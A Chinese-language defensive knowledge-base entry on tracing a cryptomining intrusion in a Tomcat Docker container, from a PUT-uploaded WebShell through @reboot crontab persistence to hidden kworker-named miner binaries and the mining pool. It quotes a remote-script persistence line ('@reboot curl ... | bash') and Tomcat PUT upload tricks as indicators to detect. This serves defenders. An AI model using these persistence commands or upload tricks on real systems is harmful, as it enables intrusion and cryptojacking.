---
id: defense-incident-response-docker-tomcat-mining-triage
title: Docker 容器内 Tomcat 挖矿入侵溯源：从 WebShell、crontab 到隐藏挖矿二进制与矿池定位
type: scenario
domain: defense
path: defense/incident-response
technique: docker-tomcat-mining-incident-triage
tags:
- incident-response
- docker
- tomcat
- mining
- webshell
- crontab
- ioc
- linux
- persistence
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V168
  verified_at: '2026-11-06T09:50:04+08:00'
  notes: 已对照原文Q1-Q9与21张图核对：top无异常进程、web.xml readonly=false、2.6KB冰蝎马/358B shell.jsp、ss无ESTABLISHED、crontab @reboot、/opt/.kthread与/opt/.X11-Xtrace隐藏ELF、启动样本后159.198.35.43:8081、nslookup nc-ph-0601-10.web-hosting.com均一致；未验证点：未执行样本、未复现容器环境。
url: /docs/defense/incident-response/defense-incident-response-docker-tomcat-mining-triage/
draft: false
kb_aliases:
- Docker Tomcat 挖矿应急
- 容器挖矿溯源
- 隐藏挖矿二进制排查
- kthread kworker 伪装挖矿
- crontab @reboot 挖矿持久化
- 矿池地址定位
---

## 一句话结论

容器内 Tomcat 出现 CPU 异常但 `top` 看不到明显挖矿进程时，按“Web 目录/配置 → 网络连接 → 计划任务 → 临时目录 → 近期可执行文件 → 运行样本观察外连 → 反查矿池域名”的顺序排查，可以在容器内串起 WebShell 入口、`@reboot` 持久化、伪装成内核线程的隐藏挖矿二进制和矿池地址。

## 原理

- **入口线索在 Web 目录**：Tomcat `DefaultServlet` 的 `readonly` 默认为 `true`；若被改为 `false`，攻击者可用 HTTP PUT 写入 JSP（配合 `/1.jsp/`、`::$DATA` 等后缀技巧），Web 目录中会出现与入侵时间窗一致、体积约 2.6KB 的冰蝎 JSP 或几百字节的反弹 Shell JSP。
- **`top` 看不到挖矿进程的原因**：挖矿样本可能由 `@reboot` 计划任务在特定时机拉起，采样时尚未运行；也可能已停止/被清理，但二进制仍留在磁盘。因此不能只依赖 `top`，要从持久化配置与落盘文件反推。
- **持久化**：攻击者常用 `crontab -l` 中可见的 `@reboot curl https://<domain>/.../exec.sh | bash`，由远程脚本负责下载二进制、设置计划任务。容器重启后仍会重新拉取。
- **隐藏二进制**：样本放在 `/opt/.kthread/kthread`、`/opt/.X11-Xtrace/kworker` 这类以 `.` 开头的目录，文件名伪装成 Linux 内核线程 `kthread`/`kworker`，在 `ps`/`top` 中降低辨识度；用 `find / -type f -executable -mtime -N` 排除系统目录可快速定位。
- **矿池定位**：直接运行样本并立即 `ss -antp`，可看到样本与矿池地址建立的 `ESTABLISHED` 连接；再对矿池 IP 做反向 DNS，可得到托管域名。
- **容器镜像特性**：容器内 `/tmp`、`/var/tmp`、`/dev/shm` 可能已被清理，但 `/opt` 等非临时目录中的隐藏文件仍在；镜像层/可写层保留完整文件时间戳，可按 mtime 排序定位入侵时间。

## 触发条件

- 有容器内 root/shell（`docker exec`）或宿主机上可读取容器文件系统与进程表。
- 样本未被删除，或仍保留 crontab、WebShell 等持久化残留。
- 容器具备 `top`、`ss`/`netstat`、`find`、`crontab`、`file` 等常用工具；必要时可在宿主机对样本做进一步分析。
- 运行样本观察矿池时，容器需可出网（或先做网络隔离评估，避免触发真实挖矿）。

## 利用步骤

1. **确认异常范围**：`docker exec -it <container> top -n 1 -b` 看 CPU 占用；若没有明显挖矿进程，转向持久化与落盘排查，并记录采样时间。
2. **检查 Web 配置与目录**：`grep -C 5 "readonly" /usr/local/tomcat/conf/web.xml`，确认 `DefaultServlet` 是否被设为 `false`；`ls -l /usr/local/tomcat/webapps/ROOT/` 按大小和时间筛出可疑 JSP（冰蝎约 2.6KB、反弹 Shell 约数百字节），读取内容确认入口与 C2。
3. **检查网络连接**：`ss -ant`/`netstat -anpt` 查看是否有 `ESTABLISHED` 的异常外连；反向 Shell 未运行时不会有长连接，不能据此排除。
4. **检查计划任务**：`crontab -l`、`/etc/cron.*`、`/etc/crontab`、systemd 单元，重点找 `@reboot curl ... | bash`、`wget ... | sh`。
5. **检查临时目录**：`ls -la /tmp /var/tmp /dev/shm`，注意隐藏文件、近期新增文件；临时目录被清空不代表样本不存在。
6. **找近期可执行文件**：`find / -type f -executable -mtime -200 2>/dev/null | grep -vE "^/(proc|sys|usr/bin|usr/sbin|bin|sbin|var/lib/docker)"`，按路径与 mtime 筛出非系统目录下的 ELF。
7. **确认文件类型与伪装**：`file <path>` 确认为 ELF；检查所在目录是否以 `.` 开头、文件名是否伪装成 `kthread`/`kworker`/`dbus-daemon` 等系统进程名；记录哈希与 mtime。
8. **运行样本抓矿池**：在受控环境启动样本后立刻 `ss -antp | grep <进程名>`，记录远端 IP:端口；对 IP 做 `nslookup`/反向 DNS，关联托管域名与下载脚本域名。
9. **固定证据后处置**：保留样本、crontab、WebShell、网络连接与容器镜像；再按 [[defense-incident-response-linux-c2-watchdog-cleanup-order]] 的顺序清理持久化与进程，最后复查。

## PoC

```bash
# 1) 容器内资源与进程
docker exec -it tomcat_analysis top -n 1 -b

# 2) Tomcat 配置与 Web 目录
docker exec -it tomcat_analysis grep -C 5 "readonly" /usr/local/tomcat/conf/web.xml
docker exec -it tomcat_analysis ls -l /usr/local/tomcat/webapps/ROOT/

# 3) 网络与计划任务
docker exec -it tomcat_analysis ss -ant
docker exec -it tomcat_analysis crontab -l

# 4) 临时目录与近期可执行文件
docker exec -it tomcat_analysis ls -la /tmp /var/tmp /dev/shm
docker exec -it tomcat_analysis find / -type f -executable -mtime -200 2>/dev/null \
  | grep -vE "^/(proc|sys|usr/bin|usr/sbin|bin|sbin|var/lib/docker)"

# 5) 启动样本并观察矿池连接
docker exec -it tomcat_analysis /opt/.X11-Xtrace/kworker &
docker exec -it tomcat_analysis ss -antp | grep kworker
# ESTAB 0 0 172.17.0.2:42552  <pool-ip>:8081  users:(("kworker",pid=234,fd=3))
```

```bash
# 6) 矿池 IP 反查域名
nslookup <pool-ip>
```

## 变体与关联

- 入口不一定是 Tomcat PUT：也可能是弱口令、反序列化或应用漏洞；排查顺序仍可复用。
- 挖矿样本可能是 Go 编写的 ELF，常带 UPX 或 UPX 变体（如 UUU packer）壳；静态脱壳失败时可在运行后从内存 dump，见 [[defense-forensics-go-miner-heap-msgpack-field-extraction]]。
- WebShell 为冰蝎时，可按体积与源码中的 `xc`/`pass` 提取密钥，见 [[defense-forensics-behinder-jsp-static-key-password-extraction]]；入口漏洞本身见 [[web-java-component-tomcat-cve-2017-12615-put-jsp-upload]]。
- 关联：[[defense-incident-response-linux-c2-watchdog-cleanup-order]]（清理顺序与看门狗）、[[defense-forensics-core-dump-secret-extraction]]（内存/核心转储提取）。

## 检测与防御

- 保持 Tomcat `readonly=true`，禁用不必要的 PUT/DELETE；Web 目录只读或与运行账户隔离；对 Web 目录做文件完整性监控，告警新增 JSP 与约 2.6KB 的可疑文件。
- 监控 `crontab`/`/etc/cron.*`/systemd 变更，告警 `@reboot` 中的 `curl|bash`、`wget|sh`。
- 容器使用只读根文件系统、最小权限与非 root 运行；限制出站，阻断矿池常用端口与非白名单域名。
- 定期扫描 `/opt`、`/tmp`、`/var/tmp`、`/dev/shm` 下以 `.` 开头目录中的可执行文件，以及伪装成 `kthread`/`kworker` 等内核线程名的非系统路径 ELF。
- 发现事件后保留容器镜像与样本，先固定证据再清理，避免破坏溯源链。
